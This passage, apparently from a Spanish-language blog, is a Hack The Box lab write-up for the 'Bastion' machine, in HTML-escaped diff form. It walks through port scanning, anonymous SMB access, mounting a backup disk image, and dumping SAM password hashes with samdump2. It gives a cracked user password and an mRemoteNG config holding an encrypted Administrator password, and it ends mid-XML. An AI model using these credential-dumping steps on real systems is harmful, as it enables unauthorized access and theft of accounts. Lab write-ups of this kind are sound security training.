+Discovered open port 49665/tcp on 10.10.10.134
+Discovered open port 49664/tcp on 10.10.10.134
+Discovered open port 49666/tcp on 10.10.10.134
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que hay un montón de puertos abiertos, por lo que vamos a lanzar un nmap para determinar que servicios hay corriendo en esos puertos&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Bastion#nmap -sV -sC -oA Bastion bastion.htb -p22,135,139,445,47001,49667,49670,49669,5985,49664,49665,49666,49668
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2019-08-27 08:42 CEST
+Nmap scan report for bastion.htb (10.10.10.134)
+Host is up (0.081s latency).
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|_  256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 33s, deviation: 0s, median: 33s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-08-27T08:43:40+02:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 67.38 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;-01--getting-access&quot;&gt;[ 01 – Getting Access]&lt;/h2&gt;
+
+&lt;p&gt;Vemos que está el puerto 445 y 139 abierto, por lo que intentamos entrar con usuario guest, Null, etc y conseguimos acceso con usuario Null mediante el modulo de impacket&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient.py NULL@bastion.htb
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+Password:
+Type help for list of commands
+# shares
+ADMIN$
+Backups
+C$
+IPC$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro de la carpeta backups, encontramos dos ficheros vhd. Los descargamos y los montamos en la máquina para analizar el contenido:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Analizando el contenido del fichero vhd, vemos que podemos mostrar el contenido de la SAM para así ver los usuarios&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/mnt/Windows/System32/config# samdump2 SYSTEM SAM
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que tenemos los hashes del usuario Administrador y del usuario L4mpje, intentamos crackear la contraseña de ambos obteniendo la de L4mpje:&lt;/p&gt;
+
+&lt;p&gt;26112010952d963c8dc4217daec986d9 –&amp;gt; bureaulampje&lt;/p&gt;
+
+&lt;p&gt;Probamos a conectarnos por ssh con el usuario L4mpje y la contraseña que hemos obtenido del hash y entramos a la máquina.&lt;/p&gt;
+
+&lt;p&gt;En el escritorio del usuario L4mpje encontramos el fichero user.txt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Bastion/user.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-02--priv-esc&quot;&gt;[ 02 – Priv. Esc.]&lt;/h2&gt;
+
+&lt;p&gt;Trás obtener el user, enumeramos toda la máquina para ver si existen credenciales almacenadas, que programas hay instalados, etc.&lt;/p&gt;
+
+&lt;p&gt;Vemos que están los siguientes programas instalados en la máquina&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&amp;gt;&lt;/span&gt;dir
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 0CB3-C487
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          ..
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Common Files
+23-02-2019  10:38    &amp;lt;DIR&amp;gt;          Internet Explorer
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Microsoft.NET
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          mRemoteNG
+23-02-2019  11:22    &amp;lt;DIR&amp;gt;          Windows Defender
+23-02-2019  10:38    &amp;lt;DIR&amp;gt;          Windows Mail
+23-02-2019  11:22    &amp;lt;DIR&amp;gt;          Windows Media Player
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Windows Multimedia Platform
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Windows NT
+23-02-2019  11:22    &amp;lt;DIR&amp;gt;          Windows Photo Viewer
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          Windows Portable Devices
+16-07-2016  15:23    &amp;lt;DIR&amp;gt;          WindowsPowerShell
+               0 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;              0 bytes
+              14 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  11.437.113.344 bytes free
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos fijamos en el programa mRemoteNG ya que es algo que no está instalado por defecto en las máqunias windows. Enumerando más la máquina vemos que existen ficheros del programa mRemoteNG en la ruta \AppData\Roaming.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;l4mpje@BASTION C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG&amp;gt;dir
+ Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 0CB3-C487
+
+ Directory of C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;4mpje&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ppData&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;oaming&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;RemoteNG
+
+22-02-2019  15:03    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+22-02-2019  15:03    &amp;lt;DIR&amp;gt;          ..
+22-02-2019  15:03             6.316 confCons.xml
+22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup
+22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup
+22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup
+22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup
+22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup
+22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup
+22-02-2019  15:03                51 extApps.xml
+22-02-2019  15:03             5.217 mRemoteNG.log
+22-02-2019  15:03             2.245 pnlLayout.xml
+22-02-2019  15:01    &amp;lt;DIR&amp;gt;          Themes
+              14 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         76.577 bytes
+               3 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  11.437.113.344 bytes free
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el contenido del fichero confCons.xml (pego la parte del admin solo)&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;mrng:Connections&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:mrng=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://mremoteng.org&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connections&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Export=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EncryptionEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AES&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;BlockCipherMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GCM&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;KdfIterations=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1000&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;FullFileEncryption=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protected=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ConfVersion=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.6&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Node&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Descr=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Panel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Domain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Hostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PuttySession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Default Settings&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Port=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3389&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ConnectToConsole=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UseCredSsp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RenderingEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ICAEncryptionStrength=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EncrBasic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPAuthenticationLevel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NoAuth&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPMinutesToIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPAlertIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;LoadBalanceInfo=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Colors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Colors16Bit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Resolution=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FitToWindow&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AutomaticResize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DisplayWallpaper=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DisplayThemes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EnableFontSmoothing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EnableDesktopComposition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;CacheBitmaps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectDiskDrives=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectPorts=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectPrinters=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectSmartCards=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectSound=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DoNotPlay&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SoundQuality=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Dynamic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectKeys=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Connected=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PreExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PostExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;MacAddress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UserField=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCCompression=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CompNone&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCEncoding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EncHextile&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCAuthMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AuthVNC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ProxyNone&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyIP=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ColNormal&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCSmartSizeMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SmartSAspect&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCViewOnly=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUsageMethod=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Never&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayHostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUseConnectionCredentials=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Yes&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritCacheBitmaps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDescription=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDisplayThemes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDisplayWallpaper=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritEnableFontSmoothing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritEnableDesktopComposition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritIcon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPanel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritProtocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPuttySession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectDiskDrives=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt;
+ &lt;span class=&quot;na&quot;&gt;InheritRedirectKeys=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectPorts=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectPrinters=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectSmartCards=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectSound=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritSoundQuality=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritResolution=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritAutomaticResize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUseConsoleSession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUseCredSsp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRenderingEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritICAEncryptionStrength=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPAuthenticationLevel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPMinutesToIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPAlertIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritLoadBalanceInfo=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPreExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPostExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritMacAddress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUserField=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCCompression=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCEncoding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCAuthMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyIP=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span 